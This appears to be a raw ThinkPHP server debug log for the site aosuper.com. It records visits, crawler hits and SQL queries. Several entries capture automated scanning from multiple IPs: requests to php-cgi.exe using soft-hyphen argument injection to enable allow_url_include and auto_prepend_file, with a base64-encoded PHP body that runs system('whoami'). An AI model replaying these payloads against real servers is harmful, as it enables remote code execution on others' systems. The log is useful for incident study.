  'sec-ch-ua' => '"Not)A;Brand";v="99", "Google Chrome";v="128", "Chromium";v="128", sec-ch-ua-mobile=?0, sec-ch-ua-platform="Linux"',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\admin\controller\Index->captcha[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000637s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002791s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` IS NULL [ RunTime:0.019514s ]
---------------------------------------------------------------
[ 2024-09-01T07:35:33+08:00 ] 193.29.13.79 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.030125s] [åžåçŽ‡ï¼š33.20req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T07:35:35+08:00 ] 193.29.13.79 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015022s] [åžåçŽ‡ï¼š66.57req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T08:24:38+08:00 ] 208.115.225.122 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š1.636067s] [åžåçŽ‡ï¼š0.61req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.12kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000724s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002852s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '208.115.225.122' ORDER BY `Id` DESC LIMIT 1 [ RunTime:1.134907s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000519s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '208.115.225.122' [ RunTime:0.007413s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('208.115.225.122' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 08:24:37' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.001544s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '208.115.225.122'  AND `ucookie` IS NULL [ RunTime:0.007047s ]
---------------------------------------------------------------
[ 2024-09-01T08:43:48+08:00 ] 178.150.14.250 GET aosuper.com/index
[è¿è¡Œæ—¶é—´ï¼š0.086342s] [åžåçŽ‡ï¼š11.58req/s] [å†…å­˜æ¶ˆè€—ï¼š2,947.56kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'aosuper.com',
  'accept-language' => 'en',
  'accept-encoding' => 'br,gzip',
  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000701s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002958s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '178.150.14.250' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.036753s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000513s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '178.150.14.250' [ RunTime:0.007385s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('178.150.14.250' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 08:43:48' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000491s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '178.150.14.250'  AND `ucookie` IS NULL [ RunTime:0.006620s ]
---------------------------------------------------------------
[ 2024-09-01T08:51:57+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.019116s] [åžåçŽ‡ï¼š52.31req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T08:51:58+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.014698s] [åžåçŽ‡ï¼š68.04req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T10:08:12+08:00 ] 193.29.13.79 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.259815s] [åžåçŽ‡ï¼š3.85req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T10:08:14+08:00 ] 193.29.13.79 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016785s] [åžåçŽ‡ï¼š59.58req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T10:27:14+08:00 ] 198.235.24.8 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.447876s] [åžåçŽ‡ï¼š2.23req/s] [å†…å­˜æ¶ˆè€—ï¼š2,943.23kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://154.85.54.177:80/',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000752s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.027604s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '198.235.24.8' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.048057s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000749s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '198.235.24.8' [ RunTime:0.070800s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('198.235.24.8' , 2 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 10:27:13' , 2 , 'æ™®é€šç½‘å‹') [ RunTime:0.000584s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '198.235.24.8'  AND `ucookie` IS NULL [ RunTime:0.006630s ]
---------------------------------------------------------------
[ 2024-09-01T10:46:34+08:00 ] 205.210.31.177 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.423753s] [åžåçŽ‡ï¼š2.36req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.96kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000705s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002809s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '205.210.31.177' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.374143s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000516s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '205.210.31.177' [ RunTime:0.007046s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('205.210.31.177' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 10:46:34' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000555s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '205.210.31.177'  AND `ucookie` IS NULL [ RunTime:0.006760s ]
---------------------------------------------------------------
[ 2024-09-01T11:28:48+08:00 ] 192.36.109.131 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.163403s] [åžåçŽ‡ï¼š6.12req/s] [å†…å­˜æ¶ˆè€—ï¼š2,947.05kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'http://aosuper.com/',
  'cache-control' => 'no-cache',
  'accept-language' => 'en-US',
  'accept' => 'text/html,application/xhtml+xml',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.3',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000720s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002797s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '192.36.109.131' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.036474s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000729s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '192.36.109.131' [ RunTime:0.010464s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('192.36.109.131' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 11:28:48' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000640s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '192.36.109.131'  AND `ucookie` IS NULL [ RunTime:0.007215s ]
---------------------------------------------------------------
[ 2024-09-01T12:27:40+08:00 ] 193.29.13.79 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.102689s] [åžåçŽ‡ï¼š9.74req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T12:27:42+08:00 ] 193.29.13.79 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015870s] [åžåçŽ‡ï¼š63.01req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T13:29:45+08:00 ] 147.78.47.62 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.024299s] [åžåçŽ‡ï¼š41.15req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T13:29:48+08:00 ] 147.78.47.62 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.017107s] [åžåçŽ‡ï¼š58.46req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T14:06:48+08:00 ] 113.215.189.217 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š2.304819s] [åžåçŽ‡ï¼š0.43req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.48kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.1192.128 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000763s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.024497s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.217' ORDER BY `Id` DESC LIMIT 1 [ RunTime:1.884784s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000566s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.217' [ RunTime:0.006735s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('113.215.189.217' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 14:06:46' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000482s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.189.217'  AND `ucookie` IS NULL [ RunTime:0.006381s ]
---------------------------------------------------------------
[ 2024-09-01T14:06:48+08:00 ] 113.215.189.217 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.045335s] [åžåçŽ‡ï¼š22.06req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.34kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.8222.111 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000887s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002750s ]
